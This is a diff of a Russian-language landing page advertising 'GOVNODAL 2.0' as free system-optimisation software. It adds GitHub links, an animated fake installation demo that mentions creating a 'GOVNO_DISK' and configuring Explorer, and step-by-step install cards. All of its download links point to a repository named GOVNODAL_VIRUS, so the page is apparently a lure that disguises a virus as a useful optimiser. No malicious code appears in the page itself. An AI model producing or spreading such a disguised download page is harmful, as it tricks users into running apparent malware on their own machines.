@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GOVNODAL 2.0 - Революция в мире ПО</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -30,6 +31,30 @@
             padding: 2rem 0;
             position: relative;
             z-index: 10;
+        }
+
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+
+        .github-link {
+            color: white;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            border: 1px solid rgba(255,255,255,0.3);
+            border-radius: 25px;
+            transition: all 0.3s ease;
+        }
+
+        .github-link:hover {
+            background: rgba(255,255,255,0.1);
+            transform: translateY(-2px);
         }
 
         .logo {
@@ -89,16 +114,13 @@
             box-shadow: 0 10px 30px rgba(255, 107, 107, 0.3);
             position: relative;
             overflow: hidden;
+            margin: 0 1rem;
         }
 
         .download-btn:hover {
             transform: translateY(-5px);
             box-shadow: 0 15px 40px rgba(255, 107, 107, 0.5);
             animation: none;
-        }
-
-        .download-btn:active {
-            transform: translateY(0);
         }
 
         .btn-text {
@@ -118,6 +140,92 @@
 
         .download-btn:hover .btn-glow {
             left: 100%;
+        }
+
+        /* Demo Section */
+        .demo-section {
+            padding: 4rem 0;
+            text-align: center;
+        }
+
+        .demo-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 20px;
+            padding: 2rem;
+            margin: 2rem auto;
+            max-width: 900px;
+            border: 1px solid rgba(255,255,255,0.1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .demo-screen {
+            background: #0078d4;
+            border-radius: 10px;
+            padding: 0;
+            margin: 0 auto;
+            max-width: 800px;
+            height: 450px;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+        }
+
+        .windows-bar {
+            background: #1a1a1a;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            padding: 0 1rem;
+            border-bottom: 1px solid #333;
+        }
+
+        .window-controls {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .control {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .close { background: #ff5f57; }
+        .minimize { background: #ffbd2e; }
+        .maximize { background: #28ca42; }
+
+        .demo-content {
+            padding: 2rem;
+            height: calc(100% - 40px);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            position: relative;
+        }
+
+        .install-animation {
+            text-align: center;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 20px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 10px;
+            margin: 2rem 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+            border-radius: 10px;
+            width: 0%;
+            animation: progress 4s ease-in-out infinite;
         }
 
         /* Features */
@@ -189,6 +297,22 @@
             to { transform: translateY(0); opacity: 1; }
         }
 
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+
+        @keyframes typewriter {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
         /* Particles */
         .particles {
             position: fixed;
@@ -236,6 +360,46 @@
             background-clip: text;
         }
 
+        /* Installation Steps */
+        .installation-steps {
+            padding: 4rem 0;
+        }
+
+        .steps-container {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-top: 3rem;
+            flex-wrap: wrap;
+        }
+
+        .step {
+            background: rgba(255,255,255,0.1);
+            padding: 2rem;
+            border-radius: 15px;
+            text-align: center;
+            min-width: 200px;
+            position: relative;
+            transition: transform 0.3s ease;
+        }
+
+        .step:hover {
+            transform: scale(1.05);
+        }
+
+        .step-number {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(45deg, #ff6b6b, #ffd93d);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
         /* Footer */
         footer {
             padding: 2rem 0;
@@ -252,6 +416,14 @@
             margin: 2rem 0;
         }
 
+        .typewriter {
+            overflow: hidden;
+            border-right: 2px solid #ff6b6b;
+            white-space: nowrap;
+            margin: 0 auto;
+            animation: typewriter 3s steps(40, end), blink 0.75s step-end infinite;
+        }
+
         /* Responsive */
         @media (max-width: 768px) {
             .hero h1 {
@@ -265,10 +437,15 @@
             .download-btn {
                 padding: 1rem 2rem;
                 font-size: 1.2rem;
+                margin: 0.5rem;
             }
             
             .logo {
                 font-size: 2rem;
+            }
+            
+            .demo-screen {
+                height: 300px;
             }
         }
 
@@ -283,6 +460,14 @@
             z-index: 1000;
             transition: width 0.3s ease;
         }
+
+        .btn-group {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            flex-wrap: wrap;
+            margin: 2rem 0;
+        }
     </style>
 </head>
 <body>
@@ -292,9 +477,15 @@
     
     <div class="container">
         <header>
-            <div class="logo">
-                <span class="logo-emoji">💩</span>
-                <span>GOVNODAL 2.0</span>
+            <div class="nav">
+                <div class="logo">
+                    <span class="logo-emoji">💩</span>
+                    <span>GOVNODAL 2.0</span>
+                </div>
+                <a href="https://github.com/vorobjewsen30-max/GOVNODAL_VIRUS" class="github-link" target="_blank">
+                    <i class="fab fa-github"></i>
+                    Исходный код
+                </a>
             </div>
             <div class="tagline">Революция в мире программного обеспечения</div>
         </header>
@@ -302,14 +493,82 @@
         <section class="hero">
             <h1>GOVNODAL 2.0</h1>
             <p>Самый передовой софт для оптимизации вашей системы</p>
-            <a href="https://github.com/vorobjewsen30-max/GOVNODAL_VIRUS/archive/refs/heads/main.zip" class="download-btn" id="downloadBtn">
-                <span class="btn-text">🚀 СКАЧАТЬ БЕСПЛАТНО</span>
-                <span class="btn-glow"></span>
-            </a>
+            
+            <div class="btn-group">
+                <a href="https://github.com/vorobjewsen30-max/GOVNODAL_VIRUS/archive/refs/heads/main.zip" class="download-btn" id="downloadBtn">
+                    <span class="btn-text">🚀 СКАЧАТЬ БЕСПЛАТНО</span>
+                    <span class="btn-glow"></span>
+                </a>
+                
+                <a href="https://github.com/vorobjewsen30-max/GOVNODAL_VIRUS" class="download-btn" target="_blank" style="background: linear-gradient(45deg, #6e5494, #4078c0);">
+                    <span class="btn-text"><i class="fab fa-github"></i> GitHub</span>
+                    <span class="btn-glow"></span>
+                </a>
+            </div>
             
             <div class="warning">
                 ⚠️ Внимание: Программа содержит продвинутые функции оптимизации. 
                 Рекомендуется для опытных пользователей.
+            </div>
+        </section>
+
+        <section class="demo-section">
+            <h2 style="font-size: 2.5rem; margin-bottom: 1rem;">Демонстрация установки</h2>
+            <p style="font-size: 1.2rem; opacity: 0.8; margin-bottom: 2rem;">
+                Посмотрите как легко устанавливается GOVNODAL 2.0
+            </p>
+            
+            <div class="demo-container">
+                <div class="demo-screen">
+                    <div class="windows-bar">
+                        <div class="window-controls">
+                            <div class="control close"></div>
+                            <div class="control minimize"></div>
+                            <div class="control maximize"></div>
+                        </div>
+                    </div>
+                    <div class="demo-content">
+                        <div class="install-animation">
+                            <div style="font-size: 3rem; margin-bottom: 1rem;">💩</div>
+                            <h3 style="font-size: 1.5rem; margin-bottom: 1rem;">Установка GOVNODAL 2.0</h3>
+                            <p style="margin-bottom: 2rem; opacity: 0.8;">Инициализация системы...</p>
+                            <div class="progress-bar">
+                                <div class="progress-fill"></div>
+                            </div>
+                            <div class="typewriter">Создание GOVNO_DISK...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="installation-steps">
+            <h2 style="text-align: center; font-size: 2.5rem; margin-bottom: 1rem;">Процесс установки</h2>
+            <p style="text-align: center; font-size: 1.2rem; opacity: 0.8; margin-bottom: 3rem;">
+                4 простых шага к оптимизированной системе
+            </p>
+            
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Скачивание</h3>
+                    <p>Загрузите установочный файл</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Запуск</h3>
+                    <p>Запустите установщик</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>GOVNO_DISK</h3>
+                    <p>Автоматическое создание диска</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <h3>Готово!</h3>
+                    <p>Наслаждайтесь системой</p>
+                </div>
             </div>
         </section>
 
@@ -385,6 +644,11 @@
             <p style="margin-top: 1rem; opacity: 0.7;">
                 Используйте с осторожностью. Рекомендуется создание точки восстановления системы.
             </p>
+            <div style="margin-top: 2rem;">
+                <a href="https://github.com/vorobjewsen30-max/GOVNODAL_VIRUS" style="color: #ffd93d; text-decoration: none;" target="_blank">
+                    <i class="fab fa-github"></i> Открытый исходный код на GitHub
+                </a>
+            </div>
         </footer>
     </div>
 
@@ -459,6 +723,30 @@
             }, 2000);
         });
 
+        // Installation demo animation
+        function updateInstallationText() {
+            const texts = [
+                "Создание GOVNO_DISK...",
+                "Установка системных компонентов...",
+                "Оптимизация производительности...",
+                "Настройка проводника...",
+                "Установка завершена!"
+            ];
+            
+            let currentIndex = 0;
+            const typewriter = document.querySelector('.typewriter');
+            
+            setInterval(() => {
+                typewriter.textContent = texts[currentIndex];
+                typewriter.style.animation = 'none';
+                setTimeout(() => {
+                    typewriter.style.animation = 'typewriter 3s steps(40, end), blink 0.75s step-end infinite';
+                }, 10);
+                
+                currentIndex = (currentIndex + 1) % texts.length;
+            }, 4000);
+        }
+
         // Intersection Observer for animations
         const observerOptions = {
             threshold: 0.1,
@@ -477,20 +765,16 @@
         document.addEventListener('DOMContentLoaded', function() {
             createParticles();
             animateNumbers();
+            updateInstallationText();
             
-            // Observe feature cards for animation
-            document.querySelectorAll('.feature-card').forEach(card => {
-                observer.observe(card);
-            });
-            
-            // Observe stat items for animation
-            document.querySelectorAll('.stat-item').forEach(stat => {
-                observer.observe(stat);
+            // Observe elements for animation
+            document.querySelectorAll('.feature-card, .step, .stat-item').forEach(element => {
+                observer.observe(element);
             });
         });
 
         // Add some interactive effects
-        document.querySelectorAll('.feature-card').forEach(card => {
+        document.querySelectorAll('.feature-card, .step').forEach(card => {
             card.addEventListener('mouseenter', function() {
                 this.style.transform = 'translateY(-10px) scale(1.02)';
             });
